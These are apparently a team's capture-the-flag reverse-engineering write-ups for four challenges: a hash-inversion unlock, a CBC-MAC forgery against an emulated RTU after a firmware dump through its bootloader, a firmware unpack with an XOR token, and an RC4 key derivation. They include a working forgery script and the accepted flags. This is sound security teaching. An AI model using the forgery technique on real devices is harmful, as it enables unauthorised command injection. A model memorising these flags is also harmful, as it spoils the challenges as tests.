> A response team recovered the ground-maintenance utility used to service the GRIFFON-FC drones an Ash Army proxy flies over the Operation Dawn theatre. The accepted service code is needed before equipment handover. Recover that code. This is a constructed software case: the attachment is a Linux utility, not flight-controller firmware or a hardware dump, and static analysis is enough.
>
> Submit `CSCTF{<service-code>}` with the exact 24 code bytes and case.

Attachment: `fcunlock`, a statically linked, stripped x86-64 ELF (682,600 bytes, sha256 `9634a7c4c4769a21eb921125a3d1b0ef560e3f4ed0202efa860861f0d2922399`) that takes the candidate service code as `argv[1]`.

**Approach / walkthrough**

1. **Recon.** `file fcunlock` → `ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, stripped`. The symbol table is gone, but the brief promises static analysis suffices, so there is no need to run it until the end.

2. **`main` (`0x4016da`).** It requires `argc == 2` (else `usage: %s <service-code>`), then `strlen(argv[1]) == 24` (the `strlen` call is at `0x4010c8`; else `ACCESS DENIED`). It packs the 24-byte input into **three 8-byte little-endian qwords** (byte `j` of block `i` shifted left by `8*j`).

   The packing is the ordinary little-endian load of each 8-byte block: block 0 is bytes `argv[1][0..7]` read as a qword, block 1 is `[8..15]`, block 2 is `[16..23]`. So recovering the three qwords and writing them back out little-endian reconstructs the input byte-for-byte — there is no permutation or interleaving between blocks to undo.

3. **The check function (`0x401655`).** Each qword passes through this routine, whose body is the MurmurHash3 64-bit finalizer `fmix64`, recognizable from its two magic constants:

   ```c
   uint64_t fmix64(uint64_t x) {
       x ^= x >> 33;
       x *= 0xff51afd7ed558ccdULL;
       x ^= x >> 33;
       x *= 0xc4ceb9fe1a85ec53ULL;
       x ^= x >> 33;
       return x;
   }
   ```

4. **The target table.** Result `i` is compared against the slot at `[0x479020 + (i+4)*8]`, i.e. a table at VA `0x479040` (file offset `0x79040`). Every slot is checked (a mismatch clears a flag rather than breaking out), then the flag decides the outcome:

   | slot | target value |
   | --- | --- |
   | 0 | `0x8bfd351846ffb86b` |
   | 1 | `0x3ff3fd892aa7e3b2` |
   | 2 | `0xf61e79e7e639e0d2` |

   The comparison loop is written so that every slot is visited regardless of an early mismatch: each qword's hash is tested against its target, and a failure clears a single success flag rather than branching straight to the deny path. Only after all three are checked does that flag select between the deny and release branches. That structure does not change the attack — all three hashes must match — but it is worth noting because it means there is no short-circuit to exploit and no per-slot timing signal; the code is purely a three-way equality gate.

   On success the utility prints `GRIFFON-FC ground-maintenance interlock released.` and `Maintenance token: CSCTF{%.*s}`, where `%.*s` is the 24-byte input itself (the two format strings live at `0x479080` and `0x4790b8`). Nothing else is hidden in the binary — the token is literally the code you supplied. The constants and targets are confirmed present in the file at the stated offsets:

   ```
   $ python3 -c 'import struct;d=open("fcunlock","rb").read()
   [print(hex(q),hex(d.find(struct.pack("<Q",q)))) for q in
   (0x8bfd351846ffb86b,0x3ff3fd892aa7e3b2,0xf61e79e7e639e0d2)]'
   0x8bfd351846ffb86b 0x79040
   0x3ff3fd892aa7e3b2 0x79048
   0xf61e79e7e639e0d2 0x79050
   ```

   Both multiply constants `0xff51afd7ed558ccd` and `0xc4ceb9fe1a85ec53` are likewise present in the file.

5. **Invert `fmix64`.** It is a bijection on 64-bit words, so there is no search: undo the steps in reverse. Each `x ^= x >> 33` is its own inverse because a right shift by ≥ 32 moves every bit past the word midpoint, so applying the same xorshift twice cancels (the high 31 bits are untouched the first time and restore the low bits the second). Each multiply by an odd constant is a unit mod 2^64 and is undone by multiplying by its modular inverse, which Python computes directly as `pow(m, -1, 1<<64)` — `0xff51afd7ed558ccd` and `0xc4ceb9fe1a85ec53` are both odd, so both inverses exist. Reversing the five steps (xorshift, inverse-multiply by C2, xorshift, inverse-multiply by C1, xorshift) recovers the unique preimage of each target.

   ```python
   import struct
   M = (1 << 64) - 1
   def inv_xs33(x): return (x ^ (x >> 33)) & M
   def inv_mul(x, m): return (x * pow(m, -1, 1 << 64)) & M
   def inv_fmix64(h):
       h = inv_xs33(h)
       h = inv_mul(h, 0xc4ceb9fe1a85ec53)
       h = inv_xs33(h)
       h = inv_mul(h, 0xff51afd7ed558ccd)
       return inv_xs33(h)
   targets = [0x8bfd351846ffb86b, 0x3ff3fd892aa7e3b2, 0xf61e79e7e639e0d2]
   code = b''.join(struct.pack('<Q', inv_fmix64(t)) for t in targets)
   print(code.decode())          # HALCYON_1B5FC6D72036689A
   ```

   The three little-endian preimages concatenate to `HALCYON_1B5FC6D72036689A` — exactly 24 printable ASCII bytes. Running each recovered qword forward through `fmix64` returns all three targets, confirming the inversion before any execution.

**Why it works**

`fmix64` is a permutation of the 64-bit word space. An xorshift by 33 (≥ half the word width) is self-inverse, and multiplying by an odd constant is invertible mod 2^64. Each stored hash therefore has exactly one preimage, computable directly with no brute force. Storing the hash of the secret protects nothing when the hash is a bijection — the "check" is reversible, so the gate hands the answer to anyone who recognizes the finalizer.

**Validation / reproduction**

Running the recovered qwords forward through `fmix64` returns all three targets. Running the binary with the 24-byte code inside the network-less Docker sandbox (`csctf-pwn:1`, `--network none` — the untrusted artifact is never detonated on the host) printed:

```
GRIFFON-FC ground-maintenance interlock released.
Maintenance token: CSCTF{HALCYON_1B5FC6D72036689A}
```

Reproduction: disassemble `fcunlock` at base `0x400000`; identify the `argc/strlen==24` gate in `main`; recognize `fmix64` from its constants; read the three targets at file offset `0x79040`; invert `fmix64` on each and pack the preimages little-endian; the 24 bytes are the service code, and the flag is `CSCTF{` + that code + `}`.

Gotchas and notes: the point value is dynamic, but the flag is static — only the score decays with solves. `tried.json` lists four submissions of the same value: the first three came back `ratelimited` (the team-wide CTFd rate limit, never a wrong-answer verdict), and the fourth, unchanged, was accepted about 5.6 minutes after the first — no guessing or sweeping. A single 5-point hint existed on the platform and was **not** purchased. A codex hand-off was attempted and failed to start (model/Daybreak incompatibility, `.codex_log.jsonl`); the solve was done in-session.

### HELIOS-RTU

> Reverse engineering · Hard · Ionut Coserea  
> Points: 540 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{UWQEybJrRNyGHlEc8uDm0uBx}
```

(Per-instance random flag, 24-byte body; the value above is ours.)

**Challenge**

> A HELIOS GRID remote terminal unit (RTU) exposes a single web service console. Behind it is a real emulated ATmega328P running signed control firmware. The unit issues a service token only for a correctly authenticated control directive — and the authentication key is physically unreadable from outside.
>
> Identify the silicon, bring up the one interface on the bench that still answers, recover the application firmware, and produce a valid authentication tag over a control directive carrying the live nonce. Interact only with your assigned instance.

The brief is a four-step checklist: identify the chip, find the interface that still answers, recover the firmware, forge a MAC over a directive carrying the current nonce. There are no downloadable attachments — the whole challenge is a per-team web console (xterm.js over one `/ws` WebSocket, JSON `{type, data}` frames) reachable at `<instance>`. Stage-1 recon (`solve/recon.py`, capped at 25 GETs) pulled the front-end assets `app.js` and `board.js`, which document a simulated bench:

- **Console commands:** `help`, `avrdude` (a faithful simulated CLI: `-c/-p/-P/-U mem:r:file:fmt`; readable memories `signature`, `lfuse/hfuse/efuse/lock`, `flash`, `eeprom`), `bench`, `wire <adapter> <lead:pin> …`, `apt install svc`.
- **Bench adapters:** `avrisp` (MISO/MOSI/SCK/RESET/VCC/GND), `usbserial` (USB), `jtagice`, `dwprobe` (debugWIRE). Pins are an Arduino Uno header set plus the dedicated `ICSP_{RESET,SCK,MISO,GND,MOSI,VCC}` block and `USB`.
- **`svc` service** (after `apt install svc`): `nonce` (8 bytes), `telemetry` (16 bytes), `sign <16 bytes>`, `exec <32-byte frame> <tag>`.

All interaction went through one paced, single-session WebSocket driver (`solve/ws.py`, `solve/dump.py`, `solve/forge.py`), logging to `loot/session.log`.

**Approach / walkthrough**

1. **Identify the silicon.** Wire an ISP programmer to the ICSP header and read the signature:

   ```
   wire avrisp MISO:ICSP_MISO MOSI:ICSP_MOSI SCK:ICSP_SCK RESET:ICSP_RESET VCC:ICSP_VCC GND:ICSP_GND
   avrdude -c avrisp -p m328p -P /dev/ttyACM0 -U signature:r:-:h
   ```

   Response: `Device signature = 0x1e950f (probably m328p)` — an ATmega328P. Fuses/lock: `lfuse=0xFF hfuse=0xD8 efuse=0xFD lock=0xFC`. `hfuse=0xD8` → `BOOTRST` on, `BOOTSZ=00` → a 2 KW boot section at `0x7000`; `lock=0xFC` → **Lock Bit mode 3 (LB=00)**, which disables further ISP programming *and memory reads*. Flash over `avrisp` returns all `0xFF` (`loot/flash_isp.txt`) — this is the "physically unreadable" key.

2. **Find the interface that still answers.** LB mode 3 blocks the external programmer, but the boot-loader lock bits `BLB=11` leave the resident serial bootloader free to `LPM` the application section. So the interface still on the bench is the **serial bootloader** over USB/UART, not the ISP programmer. Re-wire and read flash via the `arduino` (Optiboot/STK500) programmer:

   ```
   wire usbserial USB:USB
   avrdude -c arduino -p m328p -P /dev/ttyACM0 -b 115200 -U flash:r:-:i
   ```

   This returns real contents for the application region (`loot/flash_usb.txt`, Intel HEX starting `:200000000C94BA00…`), converted to `loot/flash.bin` (32 KB). The boot section `0x7000`+ still reads back as `0xFF`, confirming the 16-byte AES key lives there, out of reach.

3. **Recover the firmware (static).** Convert HEX → raw and disassemble with radare2 in AVR mode (`r2 -a avr -b 8 -e asm.cpu=ATmega328p`, via `solve/avr_dis.sh`); nothing is executed. The application firmware is a compact AES-128 plus a UART command handler:

   - AES S-box @ `0x73`, Rcon @ `0x69`, key expansion @ `0x2b6`, encrypt @ `0x39a`.
   - `main` (`0x536`) copies the **key = 16 bytes `LPM`'d from flash `0x7F00`** (inside the unreadable boot section) into the RAM key schedule at `0x100`.
   - An `xorshift32` PRNG (`0x1b8`, shifts 13/17/5, seed `0xE98EDACA`) fills the 8-byte nonce.
   - UART frames are shaped `AA <cmd> <len> <data>`:
     - **cmd 1 `sign`** (`len 16`): refuses if `rec[0] == 0xCC`, otherwise returns **AES-ECB_K(rec)** — a raw single-block encryption oracle.
     - **cmd 2 `exec`** (`len 48` = `B0 || B1 || tag`): accepts iff `tag == E_K( E_K(B0) XOR B1 )` — a two-block **CBC-MAC with a zero IV** — and then requires `B1[0]==0xCC`, `B1[1]==0x0A`, `B1[2:10]==nonce`. On success it issues the service token. The nonce is regenerated after every `exec`.
     - cmd 3 `nonce`, cmd 4 `telemetry`, cmd 5 `reseed`.

4. **The forgery.** The MAC and the signing oracle share the same key `K`, which is the classic CBC-MAC-with-an-encryption-oracle break. For a two-block message `(B0, B1)` the valid tag is `E( E(B0) XOR B1 )`, and both encryptions are exactly what `sign` computes. The only restriction is the oracle's `0xCC` first-byte filter on *its input*, and the directive data lives entirely in the second block `B1`. In one session:

   1. Fetch the live nonce.
   2. Call `sign(00*16)` to get `C0 = E(B0)`. Check `C0[0] != 0x00`; otherwise `M[0] = C0[0] XOR 0xCC = 0xCC` and the *second* `sign` call would be refused (iterate `B0 = 00…`, `01…`, `02…` until `C0[0] != 0x00`).
   3. Build the directive block `B1 = CC 0A || nonce(8) || 00*6` with the live nonce.
   4. Compute `M = C0 XOR B1`; since we control `B0`, `M[0]` is not `0xCC`, so the oracle accepts it. `tag = sign(M) = E(C0 XOR B1) = E(E(B0) XOR B1)`.
   5. Send `svc exec B0||B1 tag`.

   The core of `solve/forge.py`:

   ```python
   nonce = re.search(r'nonce = ([0-9a-f]{16})', cmd('svc nonce')).group(1)
   for b0 in ('00'*16, '01'*16, '02'*16):
       c0 = bytes.fromhex(re.search(r'([0-9a-f]{32})', cmd('svc sign '+b0).split('=')[-1]).group(1))
       if c0[0] != 0: break
   b1  = bytes.fromhex('cc0a' + nonce + '00'*6)
   m   = bytes(a ^ b for a, b in zip(c0, b1))
   tag = re.search(r'([0-9a-f]{32})', cmd('svc sign '+m.hex()).split('=')[-1]).group(1)
   cmd(f'svc exec {b0}{b1.hex()} {tag}')
   ```

   The decisive exchange from the saved session log:

   ```
   >>> svc nonce
   service: nonce = 73d217e6bf376e97
   >>> svc sign 00000000000000000000000000000000
   service: tag = 2545be16b0fcadff5d49df085d700e9e
   >>> svc sign e94fcdc4a71a12c833dedf085d700e9e
   service: tag = 10825c4e9ac7668bc9ed9178b7cc0b3f
   >>> svc exec 00000000000000000000000000000000cc0a73d217e6bf376e97000000000000 10825c4e9ac7668bc9ed9178b7cc0b3f
   service: directive authenticated
   service: control action ISSUE_TOKEN accepted
   service: SERVICE TOKEN = CSCTF{UWQEybJrRNyGHlEc8uDm0uBx}
   ```

   Check: `C0 = 2545be16…0e9e` (first byte `0x25`, non-zero, so `B0 = 00…00` was enough). `C0 XOR (cc0a 73d217e6bf376e97 000000000000) = e94fcdc4a71a12c833dedf085d700e9e`, which is exactly the second `sign` input; its first byte `0xE9` is not `0xCC`, so the oracle signed it, and its output is the tag that `exec` accepted.

**Why it works**

The `exec` check is a zero-IV CBC-MAC built directly on top of an ECB encryption oracle that uses the *same* AES key. A two-block CBC-MAC is nothing but two chained block encryptions, and the `sign` oracle computes each on demand. The directive data lives entirely in the second block `B1`, and the only filter — refuse `sign` inputs whose first byte is `0xCC` — is dodged because the second oracle input is `E(B0) XOR B1`, whose first byte we steer through our free choice of `B0`. The key is never needed, so it is irrelevant that the boot-section key is physically unreadable; the break is purely structural. The chip-identification and bootloader-dump stages matter only to read out the firmware and confirm the two primitives share `K` — once that is known, the forgery needs nothing but the two `sign` calls.

**Validation / reproduction**

In the saved session, the second `sign` input is exactly `C0 XOR B1` and the device answered `directive authenticated` and issued the token. The flag was accepted on the first submission.

Reproduce (against your own assigned instance): pull the console assets; `wire avrisp` + `avrdude -U signature:r:-:h` to confirm `1E 95 0F` and read `lock=0xFC` (ISP reads blocked, all `FF`); `wire usbserial USB:USB` + `avrdude -c arduino -b 115200 -U flash:r:-:i` to dump the app section and convert HEX → `flash.bin`; disassemble in r2 (AVR) to recover the AES-128 + UART handler and identify the ECB `sign` oracle and the 2-block zero-IV CBC-MAC `exec` check that share key `K`; run the forgery (fetch nonce, two `sign` calls, one `exec`) and read the `CSCTF{…}` token. All work was confined to our assigned instance; no scanning, flooding, or off-target requests, and no hint was purchased.

### Operation Dawn: Radio Recovery

> Reverse engineering · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{05_train_kestrel_d48e1f}`

**Challenge**

A hostile intrusion cut the field-radio support link of a fictional country. Responders pulled `firmware.bin`, a 1,048,576-byte software recovery bundle (SHA-256 `ae253e80cfca3035fe1e882c3c26a75b1d701f1b1bb343ba290d590573bc4313`), and need the administrative recovery token locked inside it. The brief is explicit that the bundle is constructed but uses *real* compression and archive records — it is not a hardware dump or a bootable radio image. That is the hint: every layer is a standard format, so each one can be opened with ordinary tools once you read its header by hand.

The entire solve is static. No part of the firmware is executed; everything below is parsing bytes with `xxd`, `cpio`, and short stdlib Python.

**Approach / walkthrough**

*1. Confirm the download and try the usual scan.* `shasum -a 256 firmware.bin` matches the brief. `binwalk firmware.bin` finds **nothing** — 85 signatures, zero hits. That is the first real signal: the container is a custom format and (as step 3 shows) the payload is zlib with a preset dictionary, so there is nothing for a carver to recognize. We parse by hand.

*2. The section table.* The first 0x60 bytes:

```
00000000: 4457 4657 0100 0400 6c6f 6164 6572 0000  DWFW....loader..
00000010: 0002 0000 6f00 0000 b159 85e0 7562 6f6f  ....o....Y..uboo
00000020: 7465 6e76 7002 0000 0040 0000 da48 070e  tenvp....@...H..
00000030: 6d73 6763 6174 0000 7042 0000 0201 0000  msgcat..pB......
00000040: b2c5 215a 726f 6f74 6673 0000 8043 0000  ..!Zrootfs...C..
00000050: 7902 0000 2973 0465 ffff ffff ffff ffff  y...)s.e........
```

Magic `DWFW`, a little-endian `u16` version (1), a `u16` section count (4), then four 20-byte entries: `name[8]` (NUL-padded), `offset`, `size`, `crc32`, each little-endian `u32`. Decoding and checking every CRC:

```python
import struct, zlib
data = open("firmware.bin", "rb").read()
magic, version, count = struct.unpack_from("<4sHH", data, 0)
for i in range(count):
    name, off, size, crc = struct.unpack_from("<8sIII", data, 8 + 20 * i)
    real = zlib.crc32(data[off:off + size])
    print(name.rstrip(b"\0").decode(), hex(off), hex(size), crc == real)
```

```
loader   0x200   0x6f   True
ubootenv 0x270   0x4000 True
msgcat   0x4270  0x102  True
rootfs   0x4380  0x279  True
```

All four CRC32s match (table value == recomputed value), so the boundaries are correct. `loader` is a "U-Boot SPL" banner; `msgcat` is plain text (init messages, `nvram get admin_token`, a decoy `nvram get et0macaddr`). The two sections that matter are `ubootenv` and `rootfs`.

*3. Pick the live U-Boot environment.* `ubootenv` is 0x4000 bytes — two 0x2000-byte **redundant** U-Boot environment copies. Each copy is `crc32 (u32 LE) | flags (u8) | "key=value\0"...`. U-Boot boots the valid copy with the *higher* flags counter. Splitting them:

```python
for base in range(0x270, 0x270 + 0x4000, 0x2000):
    blob = data[base:base + 0x2000]
    crc, flags = struct.unpack_from("<IB", blob, 0)
    env = dict(kv.split(b"=", 1) for kv in blob[5:].split(b"\0") if b"=" in kv)
    print(hex(base), "flags", flags, crc == zlib.crc32(blob[5:]),
          env[b"ethaddr"].decode(), env[b"recovery"].decode())
```

```
0x0270 flags 6 True 00:11:22:33:44:55 legacy
0x2270 flags 7 True 3c:22:fb:4a:1d:90 ready
```

Both CRCs are valid, but the MACs differ. The copy at 0x2270 has flags 7 (newer) and `recovery=ready`, so the live `ethaddr` is **`3c:22:fb:4a:1d:90`**. The `00:11:22:33:44:55` placeholder in the stale copy is a decoy, and step 6 confirms it decodes to garbage.

*4. Inflate `rootfs` — zlib with a preset dictionary.* The first bytes of `rootfs` are `78 f9 55 d4 5a 6c ...`. `0x78` is a normal zlib CMF, but FLG `0xf9` has bit 5 (**FDICT**) set, so the next four bytes `55 d4 5a 6c` are the DICTID — the Adler-32 of the dictionary the compressor used. A plain inflate therefore fails with `Z_NEED_DICT`:

```sh
python3 -c "import zlib; d=open('firmware.bin','rb').read(); zlib.decompress(d[0x4380:0x4380+0x279])" 2>&1 | tail -1
# zlib.error: Error 2 while decompressing data
```

`Error 2` is `Z_NEED_DICT`. Compute the Adler-32 of each section to find the dictionary, then inflate with it as `zdict`:

```python
stream = sections["rootfs"]
dictid = struct.unpack(">I", stream[2:6])[0]          # 0x55d45a6c
match = [n for n, b in sections.items() if zlib.adler32(b) == dictid][0]
d = zlib.decompressobj(zdict=sections[match])
out = d.decompress(stream) + d.flush()                # 633 -> 2560 bytes, d.eof == True
```

```
adler32(loader)   = 0xec4e0e6e
adler32(ubootenv) = 0x9b979561
adler32(msgcat)   = 0x55d45a6c  <-- DICTID
adler32(rootfs)   = 0xfc134041
```

The dictionary is `msgcat`. The 633-byte stream inflates cleanly (`eof=True`) to a 2560-byte archive; `file` identifies it as `ASCII cpio archive (SVR4 with no CRC)` — a newc cpio.

*5. Unpack and read the admin files.* `cpio -idv < rootfs.cpio` yields a small rootfs (`etc/banner`, `etc/inittab`, `etc/config/radio`, and `etc/init.d/{rcS,S10network,S40admin,S60httpd}`; `cpio -v` prints the file list on stderr). `etc/config/radio` holds the token:

```
admin_token=7f71b81e5beb0c17a43e6ff1554ca42178e348509e2642f4081a9e7b7bed
```

`etc/init.d/S40admin` shows the token is *not* the key — it is masked:

```sh
mac=$(fw_printenv -n ethaddr | tr -d ':')
tok=$(sed -n 's/^admin_token=//p' /etc/config/radio)
out=""; i=0
while [ -n "$tok" ]; do
    b=$(echo "$tok" | cut -c1-2); tok=$(echo "$tok" | cut -c3-)
    o=$((i % 6 * 2 + 1)); k=$(echo "$mac" | cut -c$o-$((o + 1)))
    out="$out$(printf '\\%03o' $((0x$b ^ 0x$k)))"; i=$((i + 1))
done
printf "$out" > /var/run/admin.key; chmod 600 /var/run/admin.key
```

So `admin.key` is built by XORing each hex-decoded token byte with byte `i % 6` of the live `ethaddr`. Crucially the script reads the MAC from the U-Boot environment (`fw_printenv -n ethaddr`), not from the `nvram get et0macaddr` string that also appears in `msgcat` — that second string is a decoy source.

*6. Recover the flag.* Re-implement `S40admin` in Python with the flags-7 MAC:

```python
mac = bytes.fromhex("3c22fb4a1d90")
token = bytes.fromhex("7f71b81e5beb0c17a43e6ff1554ca42178e348509e2642f4081a9e7b7bed")
key = bytes(b ^ mac[i % 6] for i, b in enumerate(token))
print(key.decode())        # CSCTF{05_train_kestrel_d48e1f}
```

The stale MAC `00:11:22:33:44:55` instead yields `b'\x7f`\x9a-\x1f\xbe...'` — non-printable garbage, confirming it is the decoy. The live MAC gives the clean flag. (In CyberChef: *From Hex* on the token, then *XOR* key `3c22fb4a1d90`, key format Hex.)

**Why it works**

Every layer is a real format that names how to open the next. The CRC-checked section table gives exact offsets, which is essential because no signature scanner recognizes the payload. The zlib stream's FDICT flag plus its Adler-32 DICTID identify the dictionary unambiguously — hashing each section shows `msgcat` is it. Inside the cpio rootfs, the token is stored XOR-masked and the boot script names both the mask operation and the MAC's true source. Finally, U-Boot's redundant-environment rule (valid copy, higher flags counter) selects which of the two MACs is live. The two decoys — the stale MAC and the `et0macaddr` string — only resolve once you follow the real boot logic rather than grabbing the first MAC-looking value.

**Validation / reproduction**

Reproduced end to end against the shipped `firmware.bin`: all four section CRC32s matched, both env copies had valid CRCs, the inflate reached end-of-stream (`eof=True`), and the flags-7 MAC decoded the token to a clean, printable `CSCTF{...}`. The stale MAC produced non-printable bytes, which cross-checks that the selection logic is right. The flag `CSCTF{05_train_kestrel_d48e1f}` was accepted on the first submission.

Reproduction summary: verify SHA-256 → parse the `DWFW` table (4 sections, all CRC-checked) → split `ubootenv` into two redundant copies and take the flags-7 MAC `3c:22:fb:4a:1d:90` → inflate `rootfs` with `zdict=msgcat` → unpack the cpio → XOR the hex token with the MAC (repeating `i % 6`). Gotchas: a plain inflate fails with `Z_NEED_DICT` until you supply the dictionary; `cpio -v` prints its file list on stderr; and the `nvram get et0macaddr` string and the stale MAC are both decoys.

### PoshTerm

> Reverse engineering · Easy · Swyam Kumar  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{4_G00D_P0W3RSH3LL_DO35_N0T_C4LL_W1K1P3D14}`

**Challenge**

Emergency airlift coordination has stalled in a fictional country after a hostile-state disruption. Responders recovered **PoshTerm**, a terminal utility with one unlisted command, and need to know what that command *prints*. The brief is explicit: work it out by static analysis, no Windows environment is needed, ignore the startup directions in the recovered user guide, and do **not** run the untrusted executable. The solve reads live Wikipedia and NASA/JPL public sources. Attachment: `chall.7z` (63,552,697 bytes, SHA-256 `a771296d0470a82a8d6080ba8967cb0b0cab589a31b0b6664e0722892dc27031`) containing only `PoshTerm.exe` and its recovered guide. Submit the exact output, including its existing `CSCTF{...}` framing, keeping case and adding no whitespace.

The important twist is that the output is never stored in plaintext — it is produced by decryption, so the whole job is to reconstruct a network-backed derivation offline.

**Approach / walkthrough**

The artifact is three layers of embedding:

```
PoshTerm.exe   .NET 9 single-file self-contained bundle (manifest v6)
  └─ PoshTerm.dll     the managed WPF app
       └─ posh.exe    embedded resource: a Node.js SEA (Single Executable Application)
            └─ bundle.js   posh — a PowerShell-like shell written in JS (the NODE_SEA_BLOB)
```

*1. Peel the .NET bundle.* `PoshTerm.exe` is ~217 MiB (227,812,228 bytes), a .NET 9 single-file self-contained bundle (the `net9.0` runtimeconfig pins Microsoft.NETCore.App + WindowsDesktop.App 9.0.20, i.e. a WPF app). Parse it statically: the **v6 bundle manifest** at the tail of the PE locates each embedded file by offset/length (the header reads `6 0 222` — manifest v6.0, 222 bundled files). Carve out `PoshTerm.dll` and decompile it with `ilspycmd`; the decompiled tree is preserved under `dec/`. Two embedded resources matter: `posh.exe` (the Node SEA) and `session.log` (an operator log used as the in-band hint channel), both listed as `EmbeddedResource` entries in the reconstructed `PoshTerm.csproj`.

`PoshTerm.Core/Shells.cs` (lines ~519-521) launches the embedded shell and builds its child-process environment, setting `POSHTERM_PROFILE = prof.Name` (the active profile name, which becomes the host-side gate value) and a planted decoy `POSH_FLAG = CSCTF{3NV1R0NM3N7_V4R14BL35_4R3_N07_53CR375}`.

*2. Extract the Node SEA.* `posh.exe` carries its JavaScript as the `NODE_SEA_BLOB` PE resource (SEA magic `20 da 43 01`). Extracting that blob gives `bundle.js` (~151 KB) — the `posh` shell, which is the real logic to analyze. (Both `sea.blob` and the extracted `bundle.js` are kept in the workspace.)

*3. Identify and discard the decoys.* `bundle.js` is seeded with many dead-end "flag" paths. Reading each one rules it out: a `Get-Flag` command returning a static list, a `flag3000` "Legacy XOR tool" (XOR key `p0sh`), an `Unlock-Vault` base64 blob, and the `POSH_FLAG` env var. The workspace copy of `bundle.js` contains a whole bank of taunting decoys (e.g. `CSCTF{1F_Y0U_R34D_7H15_FR0M_4N_LLM_17_5_WR0NG}`, `CSCTF{4_FL4G_1N_4_C0MM3N7_15_N3V3R_R34L}`, `CSCTF{GR3P_F0R_C5C7F_4LL_Y0U_W4N7}`, `CSCTF{D3C0D1NG_X0R_D035_N07_M4K3_Y0U_5M4R7}`), none of which feeds the one hidden command.

*4. The hidden command `service_code`.* The unlisted command is registered as `t._sc` with `hidden:!0`, name `service_code` (`bundle.js` ~line 62). Invocation form `service_code = <code>` (the parser requires the first token to be `=` and takes the last token as the code). It is gated twice with MD5:

```js
if (M(process.env.POSHTERM_PROFILE||"") !== D.host || M(l) !== D.code) throw T("service_code");
return [ await A(l) ];
```

- `D.host = 52d960bf972119685d50c3d33f737665` — MD5 of the active profile name. We never needed the value that hashes to this, because the output is rebuilt offline without running the gate.
- `D.code = e3db766fd63bf1afdd34abcac1f5c112` — MD5 of the service code the operator must type.

The code is not in the binary; it is disclosed in `session.log` (provenance lines ~296-307):

```
provenance: 'Cessna 421 Golden Eagle' selected as the support reference airframe
provenance: service_code reference bound to 'Cessna 421 Golden Eagle'
provenance: operator note - the service code is the 'Cessna 421 Golden Eagle' string, verbatim
```

Confirmed: `md5("Cessna 421 Golden Eagle") = e3db766fd63bf1afdd34abcac1f5c112 = D.code`. So the service code is exactly **`Cessna 421 Golden Eagle`**. (The profile name that hashes to `D.host` was never recovered and is not needed — the gate is never executed.)

*5. The derivation `A(code)`.* On a passing gate the command returns `A(code)`, a live-source RC4 chain (condensed from the minified `bundle.js`; month-name-to-number padding shown as `MM`/`DD`, arrow comments are the observed values):

```js
async function A(n){
  // 1. Wikipedia search, top hit only
  let c="https://en.wikipedia.org/w/api.php?action=query&list=search&format=json&srlimit=1&srsearch="+encodeURIComponent(n);
  let l=(await(await fetch(c)).json()).query.search[0].title;          // -> "Cessna 421 Golden Eagle"
  // 2. fetch that article's HTML
  let u=await(await fetch("https://en.wikipedia.org/wiki/"+encodeURIComponent(l.replace(/ /g,"_")))).text();
  // 3. first "Month D, YYYY" occurring after the string "first_flight"
  let h=u.indexOf("first_flight");
  let m=/([A-Za-z]+) (\d{1,2}), (\d{4})/.exec(h>=0?u.slice(h,h+160):u);
  let p=`${m[3]}-${MM}-${DD}`;                                          // -> "1965-10-14"
  // 4. NASA/JPL calendar -> Julian-date API
  let g=(await(await fetch(`https://ssd-api.jpl.nasa.gov/jd_cal.api?format=jd.7&cd=${p}`)).json()).jd; // -> "2439047.5000000"
  // 5. RC4 of an embedded hex blob, key = the JD string
  let x=Buffer.from("37f1f43867e61d207c0b78ca4385ee14f67d98e0c0cdbe6e5027ff506e302cb66b8c8c5ad07d726c0e24e9f13bbcdfa9","hex");
  return j(Buffer.from(String(g),"utf8"), x).toString("utf8");
}
```

`j(key,data)` is textbook RC4 (KSA + PRGA, `out[i] = c ^ S[(S[i]+S[j])&255]`).

*6. Reconstruct against the public sources.* Rather than run the binary, reproduce each fetch by hand (single, polite requests to the exact endpoints the challenge names; the responses are saved under `live/`):

- Wikipedia search `srlimit=1` for `Cessna 421 Golden Eagle` → top title `Cessna 421 Golden Eagle` (`live/search.json`).
- Article HTML → first `Month D, YYYY` after `first_flight` → **October 14, 1965** → `1965-10-14` (`live/page.html`).
- JPL `jd_cal.api?format=jd.7&cd=1965-10-14` → `"jd":"2439047.5000000"` (`live/jd.json`).
- RC4-decrypt the embedded blob with key `"2439047.5000000"`:

```python
def rc4(key, data):
    S=list(range(256)); j=0
    for i in range(256):
        j=(j+S[i]+key[i%len(key)])&255; S[i],S[j]=S[j],S[i]
    out=bytearray(); i=j=0
    for c in data:
        i=(i+1)&255; j=(j+S[i])&255; S[i],S[j]=S[j],S[i]
        out.append(c ^ S[(S[i]+S[j])&255])
    return bytes(out)

blob=bytes.fromhex("37f1f43867e61d207c0b78ca4385ee14f67d98e0c0cdbe6e5027ff506e302cb66b8c8c5ad07d726c0e24e9f13bbcdfa9")
print(rc4(b"2439047.5000000", blob).decode())
# -> CSCTF{4_G00D_P0W3RSH3LL_DO35_N0T_C4LL_W1K1P3D14}
```

**Why it works**

The flag is never stored in plaintext in any artifact. It is the RC4 decryption of a fixed embedded ciphertext whose *key* is derived entirely from two public web sources — the Wikipedia first-flight date of the Cessna 421 Golden Eagle, normalized to a Julian Date by JPL. Everything needed to recompute the key ships inside the bundle: the search URL, the date regex, the JD format, and the RC4 routine. The only secret input, the service code, is leaked by the operator log, so neither MD5 gate ever has to be passed and the program never has to run. The joke is self-referential: a "good PowerShell does not call Wikipedia."

**Validation / reproduction**

Verified against the saved workspace files: the exe size (227,812,228 bytes), the `net9.0` runtimeconfig, the `POSH_FLAG` decoy and `POSHTERM_PROFILE` in `Shells.cs`, the `NODE_SEA_BLOB` resource and `bundle.js`, the `service_code`/`A()`/`j()` code, the `session.log` provenance lines, and `md5("Cessna 421 Golden Eagle") = e3db766fd63bf1afdd34abcac1f5c112` matching `D.code`. The reconstructed chain reproduces the saved live responses (first date after `first_flight` = October 14, 1965; `jd = 2439047.5000000`), and the RC4 output is clean ASCII in the `CSCTF{...}` frame whose text matches the joke the challenge sets up.

